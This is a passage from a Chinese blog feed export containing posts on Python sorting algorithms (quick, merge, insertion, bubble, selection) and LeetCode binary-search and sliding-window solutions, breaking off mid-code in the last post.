        <content type="html"><![CDATA[<p>常用排序算法简单实践。</p><a id="more"></a><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>思想：</p><p>对A进行排序</p><ul><li>选择A中的任意一个元素pivot，该元素作为基准</li><li>将小于基准的元素移到左边，大于基准的元素移到右边（分区操作）</li><li>A被pivot分为两部分，继续对剩下的两部分做同样的处理</li><li>直到所有子集元素不再需要进行上述步骤</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 采用左闭右闭</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(nums,lo,hi)</span>:</span><span class="comment">#nums:List[int] ,lo:int,hi:int</span></span><br><span class="line">    <span class="keyword">if</span> lo+<span class="number">1</span>&gt;=hi:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    first=lo</span><br><span class="line">    last = hi<span class="number">-1</span></span><br><span class="line">    pivot = nums[first]</span><br><span class="line">    <span class="keyword">while</span> first&lt;last:</span><br><span class="line">        <span class="keyword">while</span> first&lt;last <span class="keyword">and</span> nums[last]&gt;=pivot:</span><br><span class="line">            last=last<span class="number">-1</span></span><br><span class="line">        nums[first]=nums[last]</span><br><span class="line">        <span class="keyword">while</span> first&lt;last <span class="keyword">and</span> nums[first]&lt;=pivot:</span><br><span class="line">            first=first+<span class="number">1</span></span><br><span class="line">        nums[last]=nums[first]</span><br><span class="line">    nums[first]=pivot</span><br><span class="line">    quick_sort(nums,lo,first)</span><br><span class="line">    quick_sort(nums,first+<span class="number">1</span>,hi)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nums=[<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">5</span>]</span><br><span class="line">quick_sort(nums,<span class="number">0</span>,len(nums))</span><br><span class="line">nums</span><br></pre></td></tr></table></figure><pre><code>[1, 3, 4, 5, 5, 6]</code></pre><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>归并排序采用分而治之的原理：</p><ul><li>将一个序列从中间位置分成两个序列；</li><li>在将这两个子序列按照第一步继续二分下去；</li><li>直到所有子序列的长度都为1，也就是不可以再二分截止。这时候再两两合并成一个有序序列即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = []</span><br><span class="line">    h = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; len(a) <span class="keyword">and</span> h &lt; len(b):</span><br><span class="line">        <span class="keyword">if</span> a[j] &lt; b[h]:</span><br><span class="line">            c.append(a[j])</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c.append(b[h])</span><br><span class="line">            h += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> j == len(a):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b[h:]:</span><br><span class="line">            c.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[j:]:</span><br><span class="line">            c.append(i)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(lists)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(lists) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lists</span><br><span class="line">    middle = len(lists)//<span class="number">2</span></span><br><span class="line">    left = merge_sort(lists[:middle])</span><br><span class="line">    right = merge_sort(lists[middle:])</span><br><span class="line">    <span class="keyword">return</span> merge(left, right)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = [<span class="number">14</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">43</span>, <span class="number">21</span>, <span class="number">19</span>]</span><br><span class="line">    <span class="keyword">print</span> (merge_sort(a))</span><br></pre></td></tr></table></figure><pre><code>[2, 14, 19, 21, 34, 43]</code></pre><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p>将无序逐个添加至有序中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="string">"""插入排序"""</span></span><br><span class="line">    <span class="comment"># 第一层for表示循环插入的遍数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</span><br><span class="line">        <span class="comment"># 设置当前需要插入的元素</span></span><br><span class="line">        current = arr[i]</span><br><span class="line">        <span class="comment"># 与当前元素比较的比较元素</span></span><br><span class="line">        pre_index = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> pre_index &gt;= <span class="number">0</span> <span class="keyword">and</span> arr[pre_index] &gt; current:</span><br><span class="line">            <span class="comment"># 当比较元素大于当前元素则把比较元素后移</span></span><br><span class="line">            arr[pre_index + <span class="number">1</span>] = arr[pre_index]</span><br><span class="line">            <span class="comment"># 往前选择下一个比较元素</span></span><br><span class="line">            pre_index -= <span class="number">1</span></span><br><span class="line">        <span class="comment"># 当比较元素小于当前元素，则将当前元素插入在 其后面</span></span><br><span class="line">        arr[pre_index + <span class="number">1</span>] = current</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">insert_sort([<span class="number">11</span>, <span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">9</span>])</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, 4, 5, 9, 11]</code></pre><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>思路：依次比较相邻的元素，前者大于后者则交换，每趟将最大值交换至最右</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(nums)</span>:</span><span class="comment"># nums：List[int]</span></span><br><span class="line">    n = len(nums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,n-i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[j]&lt;nums[j<span class="number">-1</span>]:</span><br><span class="line">                </span><br><span class="line">                nums[j],nums[j<span class="number">-1</span>]=nums[j<span class="number">-1</span>],nums[j] <span class="comment"># 两者值交换</span></span><br><span class="line">                swapped= <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">nums=[<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>]</span><br><span class="line">bubble_sort(nums)</span><br><span class="line">print(nums)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, 4, 5, 6]</code></pre><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p>思路：每次选择最小者放置左边</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection_sort</span><span class="params">(nums)</span>:</span></span><br><span class="line">    n = len(nums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        pos = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">if</span> nums[j]&lt;nums[pos]:</span><br><span class="line">                pos=j</span><br><span class="line">        nums[pos],nums[i]=nums[i],nums[pos]</span><br><span class="line">nums=[<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">selection_sort(nums)</span><br><span class="line">nums</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, 4, 5, 6]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二分查找】34.在排序数组中查找元素的第一个和最后一个位置</title>
      <link href="2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-34.%20%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE/"/>
      <url>2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-34.%20%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>二分查找</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]</p><p>示例 1：</p><pre><code>输入：nums = [5,7,7,8,8,10], target = 8输出：[3,4]</code></pre><p>示例2：</p><pre><code>输入：nums = [5,7,7,8,8,10], target = 6输出：[-1,-1]</code></pre><p>示例3：</p><pre><code>输入：nums = [], target = 0输出：[-1,-1]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchRange</span><span class="params">(self, nums, target)</span>:</span> <span class="comment"># nums list[int] ,target:int</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">-1</span>,<span class="number">-1</span>]</span><br><span class="line">        first=self.findleftpos(nums,target)</span><br><span class="line">        <span class="keyword">if</span> first==<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">-1</span>,<span class="number">-1</span>]</span><br><span class="line">        last =self.findrightpos(nums,target)</span><br><span class="line">        <span class="keyword">return</span> [first,last]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findleftpos</span><span class="params">(self,nums,target)</span>:</span></span><br><span class="line">        l=<span class="number">0</span></span><br><span class="line">        r=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> l&lt;r:</span><br><span class="line">            mid= (l+r)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]==target:</span><br><span class="line">                r=mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid]&gt;target:</span><br><span class="line">                r=mid<span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> nums[l]==target:</span><br><span class="line">            <span class="keyword">return</span> l</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findrightpos</span><span class="params">(self,nums,target)</span>:</span></span><br><span class="line">        l=<span class="number">0</span></span><br><span class="line">        r= len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> l&lt;r:</span><br><span class="line">            mid = (l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&gt;target:</span><br><span class="line">                r=mid<span class="number">-1</span></span><br><span class="line">            <span class="keyword">elif</span> nums[mid]==target:</span><br><span class="line">                l=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">nums = [<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line">target = <span class="number">8</span></span><br><span class="line">result=a.searchRange(nums,target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>[3, 4]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二分查找】81.搜索旋转排序数据II</title>
      <link href="2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-81.%20%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%20II/"/>
      <url>2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-81.%20%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%20II/</url>
      
        <content type="html"><![CDATA[<p>二分查找</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>假设按照升序排序的数组在预先未知的某个点上进行了旋转。( 例如，数组 [0,0,1,2,2,5,6] 可能变为 [2,5,6,0,0,1,2] )。编写一个函数来判断给定的目标值是否存在于数组中。若存在返回 true，否则返回 false。</code></pre><p>示例1：</p><pre><code>输入: nums = [2,5,6,0,0,1,2], target = 0输出: true</code></pre><p>示例2：</p><pre><code>输入: nums = [2,5,6,0,0,1,2], target = 3输出: false</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一：利用in判读元素是否存在于列表中</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums, target)</span> -&gt; bool:</span> <span class="comment"># List[int] ,target:int </span></span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums, target)</span>:</span>        </span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = len(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l&lt;=r:</span><br><span class="line">            mid = (l+r) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == nums[l]:  <span class="comment"># l和mid重复，l加一</span></span><br><span class="line">                l += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> nums[mid] == nums[r]:  <span class="comment"># mid和r重复，r减一</span></span><br><span class="line">                r -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &gt; nums[l]:  <span class="comment"># l到mid是有序的，判断target是否在其中</span></span><br><span class="line">                <span class="keyword">if</span> nums[l] &lt;= target &lt; nums[mid]:  <span class="comment"># target在其中，选择l到mid这段</span></span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># target不在其中，扔掉l到mid这段</span></span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &lt; nums[r]:  <span class="comment"># mid到r是有序的，判断target是否在其中</span></span><br><span class="line">                <span class="keyword">if</span> nums[mid] &lt; target &lt;= nums[r]:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = mid - <span class="number">1</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">nums = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">target = <span class="number">3</span></span><br><span class="line">result= a.search(nums,target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>False</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二分查找】69.x的平方根</title>
      <link href="2021/02/28/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-69.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/"/>
      <url>2021/02/28/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-69.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
      
        <content type="html"><![CDATA[<p>开方</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现 int sqrt(int x) 函数。</p><p>计算并返回 x 的平方根，其中 x 是非负整数。</p><p>由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p><p>示例1：</p><pre><code>输入: 4输出: 2</code></pre><p>示例2：</p><pre><code>输入: 8输出: 2说明: 8 的平方根是 2.82842...,      由于返回类型是整数，小数部分将被舍去。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mySqrt</span><span class="params">(self, x: int)</span> -&gt; int:</span></span><br><span class="line">        l, r, ans = <span class="number">0</span>, x, <span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = (l + r) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid * mid &lt;= x:</span><br><span class="line">                ans = mid</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">a.mySqrt(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【双指针】76.最小覆盖子串</title>
      <link href="2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-76.%20%E6%9C%80%E5%B0%8F%E8%A6%86%E7%9B%96%E5%AD%90%E4%B8%B2/"/>
      <url>2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-76.%20%E6%9C%80%E5%B0%8F%E8%A6%86%E7%9B%96%E5%AD%90%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>滑动窗口</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>s</code> 、一个字符串<code>t</code> 。返回 <code>s</code> 中涵盖<code>t</code>所有字符的最小子串。如果 <code>s</code>中不存在涵盖 <code>t</code>所有字符的子串，则返回空字符串 “” 。</p><p>注意：如果 <code>s</code> 中存在这样的子串，我们保证它是唯一的答案。</p><p>示例1：</p><pre><code>输入：s = &quot;ADOBECODEBANC&quot;, t = &quot;ABC&quot;输出：&quot;BANC&quot;</code></pre><p>示例2：</p><pre><code>输入：s = &quot;a&quot;, t = &quot;a&quot;输出：&quot;a&quot;</code></pre><p>提示：</p><pre><code>1 &lt;= s.length, t.length &lt;= 10^5s 和 t 由英文字母组成</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>滑动窗口思想</strong></p><p>用<code>l,r</code>表示滑动窗口的<strong>左边界和右边界</strong>，通过改变<code>l,r</code>来<strong>扩展和收缩</strong>滑动窗口，可以想象成一个窗口在字符串上游走，当这个窗口包含的元素满足条件，即包含字符串T的所有元素，记录下这个滑动窗口的长度<strong>r-l+1</strong>，这些长度中的最小值就是要求的结果。</p><ul><li><p>步骤一：不断增加<code>r</code>使滑动窗口增大，直到窗口包含了T的所有元素</p></li><li><p>步骤二：不断增加<code>l</code>使滑动窗口缩小，因为是要求最小字串，所以将不必要的元素排除在外，使长度减小，直到碰到一个必须包含的元素，这个时候不能再扔了，再扔就不满足条件了，记录此时滑动窗口的长度，并保存最小值</p></li><li><p>步骤三：让<code>l</code>再增加一个位置，这个时候滑动窗口肯定不满足条件了，那么继续从步骤一开始执行，寻找新的满足条件的滑动窗口，如此反复，直到j超出了字符串S范围。</p></li></ul><p><strong>判断窗口是否包含T中所有元素</strong></p><p>用字典<code>need</code>表示当前滑动窗口中需要的各元素数量，一开始滑动窗口为空，用T中各元素初始化<code>need</code>，在滑动窗口扩展或者收缩时，维护该<code>need</code>字典</p><ul><li>当窗口包含某个元素，<code>need</code>中该元素数量减1，表示所需元素减少1个；</li><li>当窗口移除某个元素，<code>need</code>中钙元素的数量加1</li></ul><p><code>need</code>始终记录当前滑动窗口下，还需的元素数量，在改变<code>l,r</code>时，需同步维护<code>need</code></p><p>注意：只要某个元素包含在滑动窗口中，<code>need</code>中就存储这个元素的数量，如果某个元素存储的是负数表示这个元素是多余的。如<code>need={‘A’:-2,&#39;C&#39;:1}</code>时，表示当前窗口中，2个A是多余的，同时还需要一个C。此目的是步骤二中排除不必要的元素，数量为负的就是不必要的元素，而数量为0表示刚刚好。</p><p>当<code>need</code>中所有元素的数量都小于等于0时，表示当前滑动窗口不再需要任何元素</p><p><strong>优化</strong></p><p>如果每次判断滑动窗口是否包含了T的所有元素，都去遍历<code>need</code>看是否所有元素数量都小于等于0，这个会耗费<code>O(k)</code>的时间复杂度，k代表字典长度，最坏情况下，k可能等于len(S)。</p><p>其实这个是可以避免的，我们可以维护一个额外的变量<code>needCnt</code>来记录所需元素的总数量，当我们碰到一个所需元素<code>c</code>，不仅<code>need[c]</code>的数量减少1，同时<code>needCnt</code>也要减少1，这样我们通过needCnt就可以知道是否满足条件，而无需遍历字典了。<br>前面也提到过，<code>need</code>记录了遍历到的所有元素，而只有<code>need[c]&gt;0</code>大于0时，代表<code>c</code>就是所需元素</p><p><strong>图示</strong></p><p>以S=”DOABECODEBANC”，T=”ABC”为例</p><p>初始状态：</p><img src ="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210201doublepoint01.png" width="800px"><ul><li>步骤一：不断增加j使滑动窗口增大，直到窗口包含了T的所有元素，need中所有元素的数量都小于等于0，同时needCnt也是0</li></ul><img src ="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210201doublepoint02.png" width="800px"><ul><li>步骤二：不断增加i使滑动窗口缩小，直到碰到一个必须包含的元素A，此时记录长度更新结果</li></ul><img src ="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210201doublepoint03.png" width="800px"><p>步骤三：让i再增加一个位置，开始寻找下一个满足条件的滑动窗口</p><img src ="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/210201doublepoint04.png" width="800px"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 